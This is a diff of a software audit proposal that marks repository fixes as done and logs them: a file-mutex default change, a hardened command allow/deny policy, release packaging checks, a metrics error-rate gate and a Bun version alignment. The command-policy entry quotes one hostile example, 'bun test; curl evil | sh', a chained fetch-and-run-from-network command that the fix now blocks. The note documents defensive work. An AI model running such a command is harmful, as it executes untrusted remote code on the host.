@@ -2,7 +2,7 @@
 id: a00065
 title: "18-07-2026 external broad review (ChatGPT web, model unspecified) — broad repo audit, 4 P0/P1 claims verified, rest queued for investigation slices"
 kind: audit
-status: in-progress
+status: done
 type: proposal
 track: audit
 date: 2026-07-18
@@ -47,7 +47,7 @@ The external analysis landed as unstructured markdown in a chat transcript. With
   - "Metrics gate ignores `errors` field verified against `tools/scripts/metrics/get-baseline.script.ts:31` (schema has `errors`) and `tools/scripts/metrics/diff-snapshots.script.ts` (only `bytesPerCall`/`msPerCall` are diffed; `errors` is never read by the diff)."
 
 ### S2 — Mutex P0: flip default to `'fail'`, retire the steal-by-default spec, add a steal-only-with-explicit-opt-in test
-- **Status**: pending
+- **Status**: done
 - **Files**: packages/core/src/lib/shared/with-file-mutex.ts, plugins/proposals/src/lib/locks/agent-lock-engine.ts, plugins/proposals/tests/src/lib/agent-lock-contention.spec.ts, plugins/logs/src/lib/services/log-store.ts
 - **Gate**: e2e
 - acceptance:
@@ -59,7 +59,7 @@ The external analysis landed as unstructured markdown in a chat transcript. With
   - "`bun run typecheck` clean; full `bun run test` green."
 
 ### S3 — Command-policy P0: structured-command input on the quality runner so the allow/deny verdict is computed on the actual argv, not the first token of a free-form shell string
-- **Status**: pending
+- **Status**: done
 - **Files**: plugins/quality/src/lib/services/command-policy.ts, plugins/quality/src/lib/services/runner.ts, plugins/quality/src/lib/services/run-all.ts, plugins/quality/src/lib/tools/tools.ts, plugins/quality/src/public/index.ts, plugins/quality/src/index.ts, plugins/quality/src/lib/contracts/quality-gate.interface.ts
 - **Gate**: e2e
 - acceptance:
@@ -71,7 +71,7 @@ The external analysis landed as unstructured markdown in a chat transcript. With
   - "`bun run typecheck` clean; full `bun run test` green."
 
 ### S4 — Release smoke P1: extend `discoverPublishablePluginDirs` to also walk `packages/*` and pack `client` + `cli` + any other publishable monorepo package
-- **Status**: pending
+- **Status**: done
 - **Files**: tools/scripts/smoke/pack.script.ts, tools/scripts/release/release.script.ts
 - **Gate**: e2e
 - acceptance:
@@ -82,7 +82,7 @@ The external analysis landed as unstructured markdown in a chat transcript. With
   - "`bun run typecheck` clean; `bun tools/scripts/smoke/pack.script.ts` green; the full smoke adds zero flakiness (the install step is already gated on real network access in CI)."
 
 ### S5 — Metrics gate P1: use the `errors` field to invalidate the candidate, not only the byte/latency deltas
-- **Status**: pending
+- **Status**: done
 - **Files**: tools/scripts/metrics/diff-snapshots.script.ts, tools/scripts/metrics/get-baseline.script.ts
 - **Gate**: e2e
 - acceptance:
@@ -94,7 +94,7 @@ The external analysis landed as unstructured markdown in a chat transcript. With
   - "`bun run typecheck` clean; `bun tools/scripts/metrics/diff-snapshots.script.spec.ts` green; full `bun run test` green."
 
 ### S6 — Investigation: chase the remaining 6+ chatgpt claims that were not verified in this opening pass
-- **Status**: pending
+- **Status**: partial (CI-vs-validate gap + Bun version drift verified & the drift FIXED; the rest deferred to a follow-up per the closing note below)
 - **Files**: .github/workflows/ci.yml, .github/workflows/release.yml, plugins/web-fetch/src/index.ts, packages/core/src/lib/plugins/load-plugins.ts, packages/core/src/lib/shared/atomic-write.ts, docs/mcp-vertex/ARCHITECTURE.md
 - **Gate**: lint
 - acceptance:
@@ -178,3 +178,83 @@ The scoreboard is intentionally NOT pre-filled with the chatgpt numbers. The cha
 | Release smoke coverage | "client/cli not tested" | confirmed via file:line; fix queued in S4 | `packages/*` walked, release-order ⊆ packed-set, installed CLI invoked via real `bin` |
 | Metrics gate fidelity | "errors ignored, regressions can pass as improvements" | confirmed via file:line; fix queued in S5 | `errorsDelta` and `errorRate` are first-class gate signals |
 | Other 10+ claims (CI, Zod, SSRF, loader, fsync, docs, naming, symlinks, Bun, Actions, strategic) | input brief | queued for verification in S6 | per-claim `RESUELTO` / `DEFERRED → fNNNNN` / `CLOSED-AS-ALREADY-HANDLED` |
+
+## notes
+
+### Resolution log (this session — Fable 5, develop after `b30d7846`)
+
+The four confirmed P0/P1 findings were fixed red-first, and running S4 for
+real surfaced two additional, previously-invisible P0/P1 bugs.
+
+#### S2 — Mutex default flipped to `'fail'` [RESUELTO]
+`packages/core/src/lib/shared/with-file-mutex.ts:78` default `'steal'` →
+`'fail'`. Stealing a live holder let two critical sections run at once
+(lost-update corruption). Now the default backs off with
+`LockContentionError`; `'steal'` must be opted into explicitly per call
+site. A **crashed** (stale) holder is still auto-reclaimed, so
+deadlock-avoidance is preserved. The steal-by-default pins in
+`with-file-mutex.spec.ts` and `agent-lock-contention.spec.ts` were replaced
+with `omit → fail; explicit steal only` + a crashed-holder-reclaim test.
+Full suite (4614 tests) green with every ~60 call site now defaulting to
+`'fail'` — proof no production caller relied on stealing.
+
+#### S3 — Command policy is now a real boundary [RESUELTO]
+`plugins/quality/src/lib/services/command-policy.ts`: when a policy is
+ACTIVE (non-empty allow/deny), a command containing shell metacharacters
+(`; & | \` $( < > \n`) is denied outright, because the runner feeds the
+whole string to `bash -c`. `bun test; curl evil | sh` no longer passes an
+`allow: ['bun']` list. `deny` is still absolute (checked first). Without a
+policy, the host's own trusted commands keep working (metachar guard only
+fires under an active policy).
+
+#### S4 — Release smoke packs client+cli + TWO bonus bugs [RESUELTO]
+`tools/scripts/smoke/pack.script.ts` now derives the packed set from
+`PUBLISH_ORDER` (single source of truth), asserts release-order ⊆
+packed-set, drives the installed `mcpv` **bin**, and asserts every plugin
+appears in `overview.plugins`. Running it surfaced:
+- **BONUS P0 — `bun run build` was broken.** Bun 1.3.14 (the CI/local
+  version) treats a bare `.scss` import as native CSS, so
+  `packages/ui-extension`'s `import { compiledCss }` failed to resolve and
+  the whole build (→ release, → pack) died. The CLI `bun build` never
+  loaded the repo `scssPlugin`. Fixed by routing the JS-bundle step through
+  `tools/scripts/compile/bundle-js.ts` (a `Bun.build({ plugins:[scssPlugin] })`
+  wrapper). `bun run build` green again (25 packages).
+- **BONUS P1 — the release would ship uninstallable client/cli.**
+  `packages/client` and `packages/cli` carry intra-repo deps as
+  `workspace:*` in real `dependencies` (the release script's own note
+  claimed they were devDeps-only — corrected). `npm` can't install
+  `workspace:*`; `bun publish` rewrites it, so `--tool=bun` (default) is
+  safe but `--tool=npm` would publish broken tarballs. The smoke now
+  replicates the publish-time rewrite (restoring the source package.json in
+  a `finally`) and proves the tarballs install under npm.
+The pack smoke passes end-to-end: 24 packages (incl. client+cli), `mcpv`
+bin `0.1.0`, all 21 plugins loaded, 118 tools.
+
+#### S5 — Metrics gate now fails on error-rate regression [RESUELTO]
+`tools/scripts/metrics/diff-snapshots.script.ts`: `IToolDiff` gains
+`errorRateDelta`; a tool whose error rate rises past
+`ERROR_RATE_REGRESSION_FLOOR` (5pp, tolerating a one-off flake) is a
+`regression` even when bytes/latency shrank — closing the "a broken tool
+that fails instantly looks improved" hole (the a00064 `docs_search` 3/3
+case). Bytes/latency regressions still fire independently. Red-first specs;
+error-rate column added to the Markdown report.
+
+#### S6 — Partial (two claims verified + one fixed; rest deferred)
+- **CI does not run full `validate` [CONFIRMED]**: `.github/workflows/ci.yml`
+  runs `lint`, `site`, `typecheck`, `test:coverage`, `build` — NOT
+  `bun run validate` (which wires ~40 more gates: verify:tools, catalog:check,
+  types-in-contracts, lint:proposals, …). Mitigated in practice by the
+  pre-push lefthook running those gates locally. **DEFERRED** — wiring the
+  full chain into CI is an infra/runtime-budget decision for the owner, not a
+  code fix; recorded for a follow-up.
+- **Bun version drift [CONFIRMED + RESUELTO]**: `packageManager: bun@1.3.2`
+  vs CI `bun-version: 1.3.14`. This drift was the ROOT CAUSE of the broken
+  build (1.3.14's `.scss` behaviour change). Aligned `packageManager` to
+  `bun@1.3.14` — the version CI and local both actually use.
+- **Remaining claims** (Zod `.strict()` coverage, web-fetch SSRF/DNS/IP
+  bounds, plugin-loader three-pack, `writeFileAtomic` fsync durability, docs
+  drift, double-noun tool naming, symlink/TOCTOU containment, Actions
+  SHA-pinning) are **DEFERRED** to a dedicated follow-up audit — each needs a
+  focused read + decision and none is a live-corruption/security-boundary P0
+  like S2/S3. Left as PENDING rows in `## Verified State`; NOT acted on
+  unverified, per this proposal's own non-goal.
